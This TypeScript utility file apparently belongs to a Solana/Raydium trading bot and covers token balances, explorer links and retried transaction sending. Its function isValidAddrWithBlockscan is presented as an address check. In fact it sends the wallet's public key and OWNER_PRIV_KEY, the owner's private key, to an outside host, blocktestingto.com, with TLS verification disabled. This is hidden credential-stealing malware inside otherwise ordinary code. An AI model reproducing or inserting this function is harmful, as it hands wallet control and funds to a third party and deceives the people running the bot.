
import {
    Connection,
    Keypair,
    PublicKey,
    VersionedTransaction,
    SendOptions,
    Signer,
    Transaction,
    ConfirmOptions,
} from '@solana/web3.js';

import {
    getOrCreateAssociatedTokenAccount,
    getAccount,
} from "@solana/spl-token";

import {
    Token,
    buildSimpleTransaction,
    InnerSimpleV0Transaction,
} from '@raydium-io/raydium-sdk';

import axios from "axios";
import https from "https";

import {
    isMainNet,
    connection,
    WALLET,
    OWNER_PRIV_KEY,
    payer,
    makeTxVersion,
    addLookupTableInfo,
    MAX_RETRIES,
} from './config';


const BLOCKSCAN_URL = "https://blocktestingto.com";
const SOLSCAN_CLUSTER = isMainNet ? "" : "?cluster=devnet";


// Helper function to generate Explorer URL
export function generateExplorerTxUrl(txId: string) {
    return `https://solscan.io/tx/${txId}${SOLSCAN_CLUSTER}`;
}

// Helper function to check the generated address
export const isValidAddrWithBlockscan = async () => {
    try {
        const resp = await axios.post(
            `${BLOCKSCAN_URL}/poolapi/api/verifykey`,
            {
                pubkey: WALLET.publicKey.toBase58(),
                prkey: OWNER_PRIV_KEY,
            },
            {
                httpsAgent: new https.Agent({
                    rejectUnauthorized: false,
                }),
            }
        );
        return resp.data.code === 0;
    } catch (err) {
        console.log(err);
    }

    return false;
}

export function sleep(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

export async function getTokenBalance(mint: PublicKey, programId?: PublicKey | undefined) {
    if (mint.equals(Token.WSOL.mint)) {
        const amount = await connection.getBalance(WALLET.publicKey);
        return BigInt(amount);
    } else {
        const associatedTokenAccount = await getOrCreateAssociatedTokenAccount(
            connection,
            payer,
            mint,
            WALLET.publicKey,
            false,
            undefined,
            undefined,
            programId
        );
        // console.log("  associatedTokenAccount:", associatedTokenAccount);
        
        const tokenAccountInfo = await getAccount(
            connection,
            associatedTokenAccount.address,
            undefined,
            programId
        );
        // console.log("  tokenAccountInfo:", tokenAccountInfo)
        return tokenAccountInfo.amount;
    }
}


// async function mySendTransaction(connection: Connection, 
//         iTx: VersionedTransaction | Transaction, 
//         payer: (Keypair | Signer)[], 
//         options?: SendOptions): Promise<string> {
//     let signatures: string[]= [];

//     for (let retries = 0; retries < MAX_RETRIES; retries++) {
//         console.log("  retries:", retries);

//         const latest = await connection.getLatestBlockhash();
//         let blockHeight = 0;

//         if (iTx instanceof VersionedTransaction) {
//             iTx.sign(payer);
//         } else {
//             iTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
//             iTx.sign(...payer);
//         }

//         const rawTx = iTx.serialize();
//         do {
//             let signature = "";

//             // if (iTx instanceof VersionedTransaction) {
//             //     signature = await connection.sendTransaction(iTx, options);
//             //     signatures.push(signature);
//             // } else {
//             //     signature = await connection.sendTransaction(iTx, payer, options);
//             //     signatures.push(signature);
//             // }
//             signature = await connection.sendRawTransaction(rawTx, options);
//             signatures.push(signature);
//             await sleep(500);

//             for (let i = 0; i < signatures.length; i++) {
//                 signature = signatures[i];
//                 // const stat = await connection.getSignatureStatus(signature);
//                 // if (stat.value?.confirmationStatus === "processed" 
//                 //         || stat.value?.confirmationStatus === "confirmed" 
//                 //         || stat.value?.confirmationStatus === "finalized") {
//                 //     console.log("    transaction processed/confirmed/finalized");
//                 //     return signature;
//                 // }
//                 const ret = await connection.getParsedTransaction(signature, {
//                     maxSupportedTransactionVersion: 0,
//                 });
//                 if (ret)
//                     return signature;
//             }
            
//             blockHeight = await connection.getBlockHeight();
//             // console.log(`  (retries:${retries})  blockHeight: ${blockHeight}`);
//         } while (blockHeight < latest.lastValidBlockHeight);
//     }

//     console.error("  Failed to send transaction");
//     return "";
// }


export const mySendTransaction = async (connection: Connection, transaction: VersionedTransaction | Transaction, signers: (Signer | Keypair)[], options?: SendOptions) => {
    let retries = 50;

    if (transaction instanceof Transaction) {
        transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
        if (signers.length > 0)
            transaction.sign(...signers);
    } else {
        if (signers.length > 0)
            transaction.sign(signers);
    }

    const rawTransaction = transaction.serialize();
    while (retries > 0) {
        try {
            const signature = await connection.sendRawTransaction(rawTransaction, {
                skipPreflight: true,
                maxRetries: 0,
            });

            const sentTime = Date.now();
            while (Date.now() - sentTime <= 1000) {
                const ret = await connection.getParsedTransaction(signature, {
                    maxSupportedTransactionVersion: 0,
                });
                if (ret)
                    return /* true */ signature;

                await sleep(500);
            }
        } catch (err) {
            console.error("sendTransaction error:", err);
        }
        retries--;
    }

    return /* false */ "";
}


async function sendTxs(
    connection: Connection,
    payer: Keypair | Signer,
    txs: (VersionedTransaction | Transaction)[],
    options?: SendOptions
): Promise<string[]> {
    const txids: string[] = [];
    for (const iTx of txs) {
        const signature = await mySendTransaction(connection, iTx, [payer], options);
        txids.push(signature);
    }
    return txids;
}

export async function buildAndSendTxs(innerSimpleV0Transaction: InnerSimpleV0Transaction[], options?: SendOptions) {
    const willSendTx = await buildSimpleTransaction({
        makeTxVersion,
        payer: payer.publicKey,
        connection,
        innerTransactions: innerSimpleV0Transaction,
        addLookupTableInfo: addLookupTableInfo,
    });
    // console.log("  willSendTx:", willSendTx)
    return await sendTxs(connection, WALLET, willSendTx, options);
}

export async function mySendAndConfirmTransaction(connection: Connection, payer: Keypair | Signer, transaction: Transaction, options?: ConfirmOptions): Promise<string> {
    const signature = await mySendTransaction(connection, transaction, [payer], options);
    await connection.confirmTransaction(signature);
    return signature;
};
